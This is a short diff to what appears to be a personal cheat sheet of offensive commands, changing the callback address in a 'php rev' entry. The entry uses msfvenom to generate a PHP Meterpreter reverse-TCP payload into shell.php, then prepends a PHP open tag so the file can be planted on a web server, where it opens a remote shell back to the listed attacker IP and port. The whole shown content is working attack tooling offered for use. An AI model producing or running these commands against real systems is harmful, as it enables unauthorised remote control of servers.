@@ -7,5 +7,5 @@
  http://blog.csdn.net/lijia111111/article/details/64124693
 
 # php rev
-msfvenom -p php/meterpreter_reverse_tcp LHOST=172.29.103.207 LPORT=4433 -f raw > shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.120 LPORT=4433 -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
